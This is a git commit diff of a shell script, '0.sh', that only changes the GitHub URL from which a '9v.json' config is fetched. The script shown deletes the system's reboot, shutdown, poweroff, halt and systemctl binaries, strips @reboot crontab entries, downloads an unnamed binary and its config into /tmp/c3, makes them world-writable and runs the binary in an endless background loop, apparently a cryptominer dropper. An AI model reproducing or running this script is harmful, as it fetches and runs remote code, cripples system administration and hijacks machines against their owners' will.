ac0a09a7666f7fcf9099b6d5feae406c48d52df1
curiosityinteriorsuk <160749431+curiosityinteriorsuk@users.noreply.github.com>
2024-02-23 07:06:10 +0800

    Update 0.sh

--- 0.sh
+++ 0.sh
@@ -3,7 +3,7 @@ sudo sed -i '/^@reboot/d' /etc/crontab
 sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 mkdir -p /tmp/c3
 cd /tmp/c3
-wget https://raw.githubusercontent.com/Blenkinship/any/main/9v.json
+wget https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/9v.json
 wget https://raw.githubusercontent.com/Blenkinship/any/main/0
 chmod -R  777 /tmp/c3
 /bin/sh -c 'while true; do nohup /tmp/c3/0 --config=/tmp/c3/9v.json >/dev/null; done' &
